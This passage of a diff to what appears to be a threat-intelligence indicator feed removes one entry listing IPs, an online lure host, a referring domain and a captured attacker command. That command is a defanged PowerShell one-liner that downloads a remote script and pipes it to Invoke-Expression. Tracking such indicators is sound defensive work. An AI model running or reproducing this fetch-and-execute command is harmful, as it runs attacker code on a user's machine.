-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    },
-    {
-     "ip": "63.250.43.137",
-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "youcanfreeusuk.org",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/govnologi/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "youhavefoundone.com",
